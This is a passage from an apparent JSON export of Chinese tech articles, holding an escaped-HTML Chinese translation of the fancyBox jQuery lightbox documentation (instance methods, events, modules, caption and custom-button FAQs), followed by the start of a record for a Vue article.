允许只传一个对象。打开行内元素的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.open({\n\u0009src  : '#hidden-content',\n\u0009type : 'inline',\n\u0009opts : {\n\u0009\u0009afterShow : function( instance, current ) {\n\u0009\u0009\u0009console.info( 'done!' );\n\u0009\u0009}\n\u0009}\n});\n// 译者注：行内元素如下\n\u0026lt;div id=\"#hidden-content\"\u0026gt;\n  \u0026lt;p\u0026gt;...content\u0026lt;/p\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/mqEqgr?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e如果你想展示一些html文档（例如一段信息），你只需要使用很简单的一句语法。fancyBox 建议使用一个wrapper 包裹你的内容。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.open(\u003cspan class=\"hljs-string\"\u003e'\u0026lt;div class=\"message\"\u0026gt;\u0026lt;h2\u0026gt;Hello!\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;You are awesome!\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/JOKOgP\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e7.2 实例的方法\u003c/h3\u003e\n\u003cp\u003e你需要定义一个实例来使用实例的方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e instance = $.fancybox.open(\n\u0009\u003cspan class=\"hljs-comment\"\u003e// 内容和选项\u003c/span\u003e\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从当前 active 的实例中获取信息：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e instance = $.fancybox.getInstance();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e回调函数的第一个参数返回实例信息：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e\"[data-fancybox]\"\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003eafterShow\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, current \u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.info( instance );\n\u0009}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e实例可以调用以下方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 跳到下一个相册元素\u003c/span\u003e\ninstance.next( duration );\n\n\u003cspan class=\"hljs-comment\"\u003e//跳到上一个相册元素\u003c/span\u003e\ninstance.previous( duration );\n\n\u003cspan class=\"hljs-comment\"\u003e// 调到选中的相册元素\u003c/span\u003e\ninstance.jumpTo( index, duration );\n\n\u003cspan class=\"hljs-comment\"\u003e// 检测当前尺寸是否小于实际尺寸\u003c/span\u003e\ninstance.isScaledDown();\n\n\u003cspan class=\"hljs-comment\"\u003e// 缩放到实际尺寸\u003c/span\u003e\ninstance.scaleToActual( x, y, duration );\n\n\u003cspan class=\"hljs-comment\"\u003e// 检测尺寸是否超过父元素\u003c/span\u003e\ninstance.canPan();\n\n\u003cspan class=\"hljs-comment\"\u003e// 缩放适应父元素尺寸\u003c/span\u003e\ninstance.scaleToFit( duration );\n\n\u003cspan class=\"hljs-comment\"\u003e// 更新滑块的内容和位置\u003c/span\u003e\ninstance.update();\n\n\u003cspan class=\"hljs-comment\"\u003e// 更新侧边栏的位置， 缩放内容来适应\u003c/span\u003e\ninstance.updateSlide( slide );\n\n\u003cspan class=\"hljs-comment\"\u003e// 更新 infobar 的值， 导航按钮的状态， 和展示标题\u003c/span\u003e\ninstance.updateControls( force );\n\n\u003cspan class=\"hljs-comment\"\u003e// 在侧边栏中加载自定义内容\u003c/span\u003e\ninstance.setContent( slide, content );\n\n\u003cspan class=\"hljs-comment\"\u003e// 在侧边栏中加载loading效果\u003c/span\u003e\ninstance.showLoading( slide );\n\n\u003cspan class=\"hljs-comment\"\u003e// 从侧边栏中去除loading效果\u003c/span\u003e\ninstance.hideLoading( slide );\n\n\u003cspan class=\"hljs-comment\"\u003e// 找到和把焦点放在第一个可以放置焦点的元素\u003c/span\u003e\ninstance.focus();\n\n\u003cspan class=\"hljs-comment\"\u003e// 激活当前 active 的实例，显示在最前面\u003c/span\u003e\ninstance.activate();\n\n\u003cspan class=\"hljs-comment\"\u003e// 关闭实例\u003c/span\u003e\ninstance.close();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e你可以这样使用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.getInstance().jumpTo(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或者：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.getInstance(\u003cspan class=\"hljs-string\"\u003e'jumpTo'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e7.3 事件\u003c/h3\u003e\n\u003cp\u003efancyBox 支持触发以下事件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ebeforeLoad   : 滑块的内容加载前\nafterLoad    : 滑块内容加载后\n\nbeforeShow   : 打开动画开始前\nafterShow    : 内容或者动画加载完成\n\nbeforeClose  : 实例准备关闭前，染回\u003cspan class=\"hljs-string\"\u003e`false`\u003c/span\u003e取消关闭\nafterClose   : 实例关闭后\n\nonInit       : 实例初始化完成\nonActivate   : 实例active状态\nonDeactivate : 其他实例变为active状态\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e事件可以作为一个对象的函数属性，该对象作为参数传入到 fancyBox 初始化方法中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u0026lt;script type=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n\u0009$(\u003cspan class=\"hljs-string\"\u003e\"[data-fancybox]\"\u003c/span\u003e).fancybox({\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eafterShow\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, slide \u003c/span\u003e) \u003c/span\u003e{\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Tip: Each event passes useful information within the event object:\u003c/span\u003e\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Object containing references to interface elements\u003c/span\u003e\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// (background, buttons, caption, etc)\u003c/span\u003e\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// console.info( instance.$refs );\u003c/span\u003e\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Current slide options\u003c/span\u003e\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// console.info( slide.opts );\u003c/span\u003e\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Clicked element\u003c/span\u003e\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// console.info( slide.opts.$orig );\u003c/span\u003e\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// Reference to DOM element of the slide\u003c/span\u003e\n\u0009\u0009\u0009\u003cspan class=\"hljs-comment\"\u003e// console.info( slide.$slide );\u003c/span\u003e\n\n\u0009\u0009}\n\u0009});\n\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每一个回调函数接收两个参数 —— 当前的 fancyBox 实例和当前的相册对象（如果它们存在）。\u003c/p\u003e\n\u003cp\u003efancyBox也支持触发所有的实例事件。为了防止和其他的脚本产生干扰，这些事件命名为\u003ccode\u003e.fb\u003c/code\u003e结尾。这些事件函数接收3个参数—事件（event），当前的 fancyBox 实例和当前的相册对象。\u003c/p\u003e\n\u003cp\u003e下面例子是绑定\u003ccode\u003eafterShow\u003c/code\u003e事件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'afterShow.fb'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e e, instance, slide \u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-comment\"\u003e// Your code goes here\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你想阻止当前弹窗的关闭（例如在表单提交之后），可以使用\u003ccode\u003ebeforeClose\u003c/code\u003e。只需要返回\u003ccode\u003efalse\u003c/code\u003e即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ebeforeClose : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, current, e \u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( $(\u003cspan class=\"hljs-string\"\u003e'#my-field'\u003c/span\u003e).val() == \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e ) {\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e8. 模块\u003c/h2\u003e\n\u003cp\u003efancyBox 代码被分成几个扩展核心功能的文件（模块）。你可以通过去除不必要的模块来构建你自己的 fancyBox 版本。如果需要，每一个模块有自己的\u003ccode\u003e.js\u003c/code\u003e和\u003ccode\u003e.css\u003c/code\u003e文件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 自定义、添加新的媒体类型\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 例如:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e/*\nmedia : {\n\u0009youtube : {\n\u0009\u0009params : {\n\u0009\u0009\u0009autoplay : 0\n\u0009\u0009}\n\u0009}\n}\n*/\u003c/span\u003e\nmedia : {},\n\n\u003cspan class=\"hljs-attr\"\u003eslideShow\u003c/span\u003e : {\n\u0009\u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\u0009\u003cspan class=\"hljs-attr\"\u003espeed\u003c/span\u003e     : \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e\n},\n\n\u003cspan class=\"hljs-attr\"\u003ethumbs\u003c/span\u003e : {\n\u0009\u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e   : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,                  \u003cspan class=\"hljs-comment\"\u003e// 打开时显示缩略图\u003c/span\u003e\n\u0009hideOnClose : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,                   \u003cspan class=\"hljs-comment\"\u003e// Hide thumbnail grid when closing animation starts\u003c/span\u003e\n\u0009parentEl    : \u003cspan class=\"hljs-string\"\u003e'.fancybox-container'\u003c/span\u003e,  \u003cspan class=\"hljs-comment\"\u003e// Container is injected into this element\u003c/span\u003e\n\u0009axis        : \u003cspan class=\"hljs-string\"\u003e'y'\u003c/span\u003e                     \u003cspan class=\"hljs-comment\"\u003e// Vertical (y) or horizontal (x) scrolling\u003c/span\u003e\n}\n\nExample (show thumbnails on start):\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e开始时展示缩略图的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$(\u003cspan class=\"hljs-string\"\u003e'[data-fancybox=\"images\"]'\u003c/span\u003e).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003ethumbs\u003c/span\u003e : {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eautoStart\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u0009}\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你查看了 fancyBox 的实例对象，你会发现一些key的值是大写的 —— 他们关联着其他模块的对象。当然，你也会发现 fancyBox 使用和 jQuery 一直的前缀 \u003ccode\u003e$\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e下面例子为如何拿到缩略图栅格元素：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.getInstance().Thumbs.$grid\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e下面例子为如何调用切换缩略图的方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.getInstance().Thumbs.toggle();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可使用的方法列表：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eThumbs.focus()\nThumbs.update();\nThumbs.hide();\nThumbs.show();\nThumbs.toggle();\n\nFullScreen.request( elem );\nFullScreen.exit();\nFullScreen.toggle( elem );\nFullScreen.isFullscreen();\nFullScreen.enabled();\n\nSlideShow.start();\nSlideShow.stop();\nSlideShow.toggle();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你想禁止 hash 模块，使用下面代码片段（引用 JS 之后）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$.fancybox.defaults.hash = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e9. FAQ\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. 打开、关闭导致固定定位的元素移动\u003c/h3\u003e\n\u003cp\u003e在固定定位的元素的class中加入\u003ccode\u003ecompensate-for-scrollbar\u003c/code\u003e。例子为使用Bootstrap的navbar组件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003enav\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"navbar navbar-inverse navbar-fixed-top compensate-for-scrollbar\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0009\u0009..\n\u0009\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003enav\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/xPOpZx?editors=1000\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e上个例子中，脚本会测量滚动条的宽度，创建\u003ccode\u003ecompensate-for-scrollbar\u003c/code\u003e样式并将宽度值复制到该样式的\u003ccode\u003emargin-right\u003c/code\u003e属性。因此，如果你的元素宽度设置为\u003ccode\u003ewidth:100%\u003c/code\u003e，你应该同时使用\u003ccode\u003eleft\u003c/code\u003e和\u003ccode\u003eright\u003c/code\u003e定位，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.navbar\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: fixed;\n  \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eright\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. 如何自定义标题\u003c/h3\u003e\n\u003cp\u003e你可以使用\u003ccode\u003ecaption\u003c/code\u003e选项，它接收一个函数，并且被组内的每个元素调用。例子为增加图片下载链接：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$( \u003cspan class=\"hljs-string\"\u003e'[data-fancybox=\"images\"]'\u003c/span\u003e ).fancybox({\n    \u003cspan class=\"hljs-attr\"\u003ecaption\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, item \u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e caption = $(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e).data(\u003cspan class=\"hljs-string\"\u003e'caption'\u003c/span\u003e) || \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( item.type === \u003cspan class=\"hljs-string\"\u003e'image'\u003c/span\u003e ) {\n            caption = (caption.length ? caption + \u003cspan class=\"hljs-string\"\u003e'\u0026lt;br /\u0026gt;'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'\u0026lt;a href=\"'\u003c/span\u003e + item.src + \u003cspan class=\"hljs-string\"\u003e'\"\u0026gt;Download image\u0026lt;/a\u0026gt;'\u003c/span\u003e ;\n        }\n\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e caption;\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/jarYdo?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在标题右边增加当前图片的序号和图片总数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$( \u003cspan class=\"hljs-string\"\u003e'[data-fancybox=\"images\"]'\u003c/span\u003e ).fancybox({\n    \u003cspan class=\"hljs-attr\"\u003einfobar\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ecaption\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, item \u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e caption = $(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e).data(\u003cspan class=\"hljs-string\"\u003e'caption'\u003c/span\u003e) || \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ( caption.length ? caption + \u003cspan class=\"hljs-string\"\u003e'\u0026lt;br /\u0026gt;'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e ) + \u003cspan class=\"hljs-string\"\u003e'Image \u0026lt;span data-fancybox-index\u0026gt;\u0026lt;/span\u0026gt; of \u0026lt;span data-fancybox-count\u0026gt;\u0026lt;/span\u0026gt;'\u003c/span\u003e;\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/EbyQMQ?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003ecaption\u003c/code\u003e方法里面，\u003ccode\u003ethis\u003c/code\u003e指向被点击的元素。例子为使用不同的标题：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e$( \u003cspan class=\"hljs-string\"\u003e'[data-fancybox]'\u003c/span\u003e ).fancybox({\n\u0009\u003cspan class=\"hljs-attr\"\u003ecaption\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e instance, item \u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e $(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e).find(\u003cspan class=\"hljs-string\"\u003e'figcaption'\u003c/span\u003e).html();\n\u0009}\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/EbyQzE?editors=1010\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. 如何在tool上创建自定义按钮\u003c/h3\u003e\n\u003cp\u003e创建可重复使用的按钮例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 创建按钮模板\u003c/span\u003e\n$.fancybox.defaults.btnTpl.fb = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;button data-fancybox-fb class=\"fancybox-button fancybox-button--fb\" title=\"Facebook\"\u0026gt;'\u003c/span\u003e +\n    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;svg viewBox=\"0 0 24 24\"\u0026gt;'\u003c/span\u003e +\n        \u003cspan class=\"hljs-string\"\u003e'\u0026lt;path d=\"M22.676 0H1.324C.594 0 0 .593 0 1.324v21.352C0 23.408.593 24 1.324 24h11.494v-9.294h-3.13v-3.62h3.13V8.41c0-3.1 1.894-4.785 4.66-4.785 1.324 0 2.463.097 2.795.14v3.24h-1.92c-1.5 0-1.793.722-1.793 1.772v2.31h3.584l-.465 3.63h-3.12V24h6.115c.733 0 1.325-.592 1.325-1.324V1.324C24 .594 23.408 0 22.676 0\"/\u0026gt;'\u003c/span\u003e +\n    \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/svg\u0026gt;'\u003c/span\u003e +\n\u003cspan class=\"hljs-string\"\u003e'\u0026lt;/button\u0026gt;'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-comment\"\u003e// 使用时间代理使按钮可点击\u003c/span\u003e\n$(\u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'[data-fancybox-fb]'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.open(\u003cspan class=\"hljs-string\"\u003e\"https://www.facebook.com/sharer/sharer.php?u=\"\u003c/span\u003e+\u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.location.href)+\u003cspan class=\"hljs-string\"\u003e\"\u0026amp;t=\"\u003c/span\u003e+\u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.title), \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'left=0,top=0,width=600,height=300,menubar=no,toolbar=no,resizable=yes,scrollbars=yes'\u003c/span\u003e);\n});\n\n\u003cspan class=\"hljs-comment\"\u003e// 自定义按钮\u003c/span\u003e\n$( \u003cspan class=\"hljs-string\"\u003e'[data-fancybox=\"images\"]'\u003c/span\u003e ).fancybox({\n  \u003cspan class=\"hljs-attr\"\u003ebuttons\u003c/span\u003e : [\n    \u003cspan class=\"hljs-string\"\u003e'fb'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e\n  ]\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/MOEXmJ\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4. 如何重置缩略图栅格的位置\u003c/h3\u003e\n\u003cp\u003e这里没有 JS 选项去改变缩略图栅格的位置，但是 fancyBox 允许你使用 CSS 来改变每个块元素的位置或者尺寸（例如：内容区域，标题或者缩略图栅格）。这使你很自由的改变弹框窗口的外观和样式。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/RjRQzm\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5. 如何禁止touch操作\u003c/h3\u003e\n\u003cp\u003e当你想内容可选择或者可点击，有两个选项：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e设置\u003ccode\u003etouch:false\u003c/code\u003e完全禁止 touch 操作\u003c/li\u003e\n\u003cli\u003e添加\u003ccode\u003edata-selectable=\"true\"\u003c/code\u003e属性到你的 html 元素\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://codepen.io/fancyapps/pen/OOXxLa\"\u003e在 CodePen 上查看例子\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514886525.7753","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc7459"},"id":"5a4b78226fb9a0451a76c1a1","author":{"$oid":"5a4cc1f937991328ecbc743f"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b6ce459a28144?w=2238\u0026h=1540\u0026f=png\u0026s=396095","https://user-gold-cdn.xitu.io/2018/1/2/160b6ce8b0cd7561?w=684\u0026h=329\u0026f=png\u0026s=59870","https://user-gold-cdn.xitu.io/2018/1/2/160b6d01006d77e2?w=837\u0026h=375\u0026f=png\u0026s=29815","https://user-gold-cdn.xitu.io/2018/1/2/160b6d0bb86b9466?w=600\u0026h=321\u0026f=gif\u0026s=580480","https://user-gold-cdn.xitu.io/2018/1/2/160b6d26a8fdad52?w=1656\u0026h=1300\u0026f=png\u0026s=188292","https://user-gold-cdn.xitu.io/2018/1/2/160b6d2db4d44c30?w=695\u0026h=604\u0026f=png\u0026s=25205","https://user-gold-cdn.xitu.io/2018/1/2/160b6d4518bdf686?w=1656\u0026h=717\u0026f=png\u0026s=120175","https://user-gold-cdn.xitu.io/2018/1/2/160b6cee7c28ad9f?w=456\u0026h=522\u0026f=png\u0026s=17159","https://user-gold-cdn.xitu.io/2018/1/2/160b6d4e3bf96776?w=523\u0026h=257\u0026f=png\u0026s=9754","https://user-gold-cdn.xitu.io/2018/1/2/160b6d545e5aefa2?w=1200\u0026h=2800\u0026f=png\u0026s=130323","https://user-gold-cdn.xitu.io/2018/1/2/160b6d5fb581c3c5?w=995\u0026h=573\u0026f=png\u0026s=62905","https://user-gold-cdn.xitu.io/2018/1/2/160b6d6cbfd637c6?w=1994\u0026h=486\u0026f=png\u0026s=104721","https://user-gold-cdn.xitu.io/2018/1/2/160b6d64238b93b5?w=1416\u0026h=2049\u0026f=png\u0026s=333121"],"screenShot":null}],"title":"2018 我所了解的 Vue 知识大全","meta":{"likeCount":0},"tag":["Vue.js"],"comment":[],"shortContent":"每个 Vue 实例在被创建之前都要经过一系列的初始化过程。例如需要设置数据监听、编译模板、挂载实例到 DOM、在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，给予用户机会在一些特定的场景下添加他们自己的代码。","content":"\u003cp\u003e\u003ci\u003e年初第一个 flag 